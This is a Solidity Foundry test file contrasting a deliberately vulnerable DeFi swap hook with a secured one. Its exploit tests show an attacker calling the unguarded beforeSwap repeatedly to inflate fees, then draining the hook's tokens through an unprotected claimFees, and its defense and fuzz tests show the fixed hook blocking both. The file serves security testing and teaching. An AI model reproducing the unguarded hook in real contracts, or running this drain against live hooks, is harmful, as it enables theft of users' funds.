// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IPoolManager} from "../src/interfaces/IPoolManager.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "../src/types/PoolId.sol";
import {Currency, CurrencyLibrary} from "../src/types/Currency.sol";
import {IHooks} from "../src/interfaces/IHooks.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {BalanceDelta} from "../src/types/BalanceDelta.sol";
import {BeforeSwapDelta, BeforeSwapDeltaLibrary} from "../src/types/BeforeSwapDelta.sol";
import {Deployers} from "./utils/Deployers.sol";
import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {MockERC20} from "solmate/src/test/utils/mocks/MockERC20.sol";

contract VulnerableHookInline is IHooks {
    IPoolManager public immutable poolManager;
    address public owner;
    mapping(address => uint256) public collectedFees;
    uint256 constant FEE_AMOUNT = 1e15;

    error NotPoolManager();
    error NotOwner();

    constructor(IPoolManager _pm) {
        poolManager = _pm;
        owner = msg.sender;
    }

    // BUG: no onlyPoolManager modifier
    function beforeSwap(address, PoolKey calldata key, SwapParams calldata params, bytes calldata)
        external override returns (bytes4, BeforeSwapDelta, uint24)
    {
        address inputToken = params.zeroForOne
            ? Currency.unwrap(key.currency0)
            : Currency.unwrap(key.currency1);
        collectedFees[inputToken] += FEE_AMOUNT;
        return (IHooks.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }

    // BUG: no access control
    function claimFees(address token, address recipient) external {
        uint256 amt = collectedFees[token];
        collectedFees[token] = 0;
        MockERC20(token).transfer(recipient, amt);
    }

    function beforeInitialize(address, PoolKey calldata, uint160) external pure override returns (bytes4) { return IHooks.beforeInitialize.selector; }
    function afterInitialize(address, PoolKey calldata, uint160, int24) external pure override returns (bytes4) { return IHooks.afterInitialize.selector; }
    function beforeAddLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, bytes calldata) external pure override returns (bytes4) { return IHooks.beforeAddLiquidity.selector; }
    function afterAddLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, BalanceDelta, BalanceDelta, bytes calldata) external pure override returns (bytes4, BalanceDelta) { return (IHooks.afterAddLiquidity.selector, BalanceDelta.wrap(0)); }
    function beforeRemoveLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, bytes calldata) external pure override returns (bytes4) { return IHooks.beforeRemoveLiquidity.selector; }
    function afterRemoveLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, BalanceDelta, BalanceDelta, bytes calldata) external pure override returns (bytes4, BalanceDelta) { return (IHooks.afterRemoveLiquidity.selector, BalanceDelta.wrap(0)); }
    function afterSwap(address, PoolKey calldata, SwapParams calldata, BalanceDelta, bytes calldata) external pure override returns (bytes4, int128) { return (IHooks.afterSwap.selector, 0); }
    function beforeDonate(address, PoolKey calldata, uint256, uint256, bytes calldata) external pure override returns (bytes4) { return IHooks.beforeDonate.selector; }
    function afterDonate(address, PoolKey calldata, uint256, uint256, bytes calldata) external pure override returns (bytes4) { return IHooks.afterDonate.selector; }
}

contract SecureHookInline is IHooks {
    IPoolManager public immutable poolManager;
    address public owner;
    mapping(address => uint256) public collectedFees;
    uint256 constant FEE_AMOUNT = 1e15;

    error NotPoolManager();
    error NotOwner();

    modifier onlyPoolManager() {
        if (msg.sender != address(poolManager)) revert NotPoolManager();
        _;
    }

    constructor(IPoolManager _pm) {
        poolManager = _pm;
        owner = msg.sender;
    }

    // FIXED: onlyPoolManager guard
    function beforeSwap(address, PoolKey calldata key, SwapParams calldata params, bytes calldata)
        external override onlyPoolManager returns (bytes4, BeforeSwapDelta, uint24)
    {
        address inputToken = params.zeroForOne
            ? Currency.unwrap(key.currency0)
            : Currency.unwrap(key.currency1);
        collectedFees[inputToken] += FEE_AMOUNT;
        return (IHooks.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }

    // FIXED: owner-only
    function claimFees(address token, address recipient) external {
        if (msg.sender != owner) revert NotOwner();
        uint256 amt = collectedFees[token];
        collectedFees[token] = 0;
        MockERC20(token).transfer(recipient, amt);
    }

    function beforeInitialize(address, PoolKey calldata, uint160) external pure override returns (bytes4) { return IHooks.beforeInitialize.selector; }
    function afterInitialize(address, PoolKey calldata, uint160, int24) external pure override returns (bytes4) { return IHooks.afterInitialize.selector; }
    function beforeAddLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, bytes calldata) external pure override returns (bytes4) { return IHooks.beforeAddLiquidity.selector; }
    function afterAddLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, BalanceDelta, BalanceDelta, bytes calldata) external pure override returns (bytes4, BalanceDelta) { return (IHooks.afterAddLiquidity.selector, BalanceDelta.wrap(0)); }
    function beforeRemoveLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, bytes calldata) external pure override returns (bytes4) { return IHooks.beforeRemoveLiquidity.selector; }
    function afterRemoveLiquidity(address, PoolKey calldata, ModifyLiquidityParams calldata, BalanceDelta, BalanceDelta, bytes calldata) external pure override returns (bytes4, BalanceDelta) { return (IHooks.afterRemoveLiquidity.selector, BalanceDelta.wrap(0)); }
    function afterSwap(address, PoolKey calldata, SwapParams calldata, BalanceDelta, bytes calldata) external pure override returns (bytes4, int128) { return (IHooks.afterSwap.selector, 0); }
    function beforeDonate(address, PoolKey calldata, uint256, uint256, bytes calldata) external pure override returns (bytes4) { return IHooks.beforeDonate.selector; }
    function afterDonate(address, PoolKey calldata, uint256, uint256, bytes calldata) external pure override returns (bytes4) { return IHooks.afterDonate.selector; }
}

contract HookReentrancySuiteTest is Test, Deployers {
    using PoolIdLibrary for PoolKey;

    VulnerableHookInline public vulnHook;
    SecureHookInline public secureHook;

    PoolKey vulnKey;
    PoolKey secureKey;

    address attacker;
    uint160 constant SQRT_LIMIT_ZFO = TickMath.MIN_SQRT_PRICE + 1;

    function setUp() public {
        attacker = makeAddr("attacker");
        deployFreshManagerAndRouters();
        deployMintAndApprove2Currencies();

        address vulnAddr = address(uint160(Hooks.BEFORE_SWAP_FLAG));
        deployCodeTo("HookReentrancySuite.t.sol:VulnerableHookInline", abi.encode(manager), vulnAddr);
        vulnHook = VulnerableHookInline(vulnAddr);

        address secureAddr = address(uint160(Hooks.BEFORE_SWAP_FLAG) | uint160(0x1000));
        deployCodeTo("HookReentrancySuite.t.sol:SecureHookInline", abi.encode(manager), secureAddr);
        secureHook = SecureHookInline(secureAddr);

        MockERC20(Currency.unwrap(currency0)).mint(address(vulnHook), 100e15);
        MockERC20(Currency.unwrap(currency0)).mint(address(secureHook), 100e18);

        (vulnKey,)   = initPool(currency0, currency1, IHooks(address(vulnHook)),   3000, SQRT_PRICE_1_1);
        (secureKey,) = initPool(currency0, currency1, IHooks(address(secureHook)), 3000, SQRT_PRICE_1_1);
    }

    function test_exploit_directBypass_inflatesAccounting() public {
        address token0 = Currency.unwrap(currency0);
        uint256 feesBefore = vulnHook.collectedFees(token0);

        vm.prank(attacker);
        SwapParams memory params = SwapParams({
            zeroForOne: true, amountSpecified: -1e18, sqrtPriceLimitX96: SQRT_LIMIT_ZFO
        });
        vulnHook.beforeSwap(attacker, vulnKey, params, "");

        uint256 feesAfter = vulnHook.collectedFees(token0);
        assertGt(feesAfter, feesBefore, "EXPLOIT: fees inflated without real swap");
        console2.log("[EXPLOIT 1] Inflated fees by:", feesAfter - feesBefore);
    }

    function test_exploit_drainsFees() public {
        address token0 = Currency.unwrap(currency0);
        uint256 hookBal = MockERC20(token0).balanceOf(address(vulnHook));
        uint256 iterations = hookBal / 1e15;

        SwapParams memory params = SwapParams({
            zeroForOne: true, amountSpecified: -1e18, sqrtPriceLimitX96: SQRT_LIMIT_ZFO
        });

        vm.startPrank(attacker);
        for (uint256 i; i < iterations; i++) {
            vulnHook.beforeSwap(attacker, vulnKey, params, "");
        }
        vulnHook.claimFees(token0, attacker);
        vm.stopPrank();

        uint256 stolen = MockERC20(token0).balanceOf(attacker);
        console2.log("[EXPLOIT 2] Stolen:", stolen);
        assertGt(stolen, 0, "EXPLOIT: attacker drained real tokens");
        assertEq(MockERC20(token0).balanceOf(address(vulnHook)), 0, "hook fully drained");
    }

    function test_defense_onlyPoolManager_blocksDirectCall() public {
        SwapParams memory params = SwapParams({
            zeroForOne: true, amountSpecified: -1e18, sqrtPriceLimitX96: SQRT_LIMIT_ZFO
        });
        vm.prank(attacker);
        vm.expectRevert(SecureHookInline.NotPoolManager.selector);
        secureHook.beforeSwap(attacker, secureKey, params, "");
        console2.log("[DEFENSE 1] Direct call blocked");
    }

    function test_defense_onlyOwner_blocksClaim() public {
        address token0 = Currency.unwrap(currency0);
        vm.prank(attacker);
        vm.expectRevert(SecureHookInline.NotOwner.selector);
        secureHook.claimFees(token0, attacker);
        console2.log("[DEFENSE 2] Unauthorized claim blocked");
    }

    function testFuzz_anyCallerRejectedExceptManager(address caller) public {
        vm.assume(caller != address(manager));
        SwapParams memory params = SwapParams({
            zeroForOne: true, amountSpecified: -1e18, sqrtPriceLimitX96: SQRT_LIMIT_ZFO
        });
        vm.prank(caller);
        vm.expectRevert(SecureHookInline.NotPoolManager.selector);
        secureHook.beforeSwap(caller, secureKey, params, "");
    }

    function testFuzz_anyCallerRejectedOnClaim(address caller) public {
        address token0 = Currency.unwrap(currency0);
        vm.assume(caller != secureHook.owner());
        vm.prank(caller);
        vm.expectRevert(SecureHookInline.NotOwner.selector);
        secureHook.claimFees(token0, caller);
    }
}
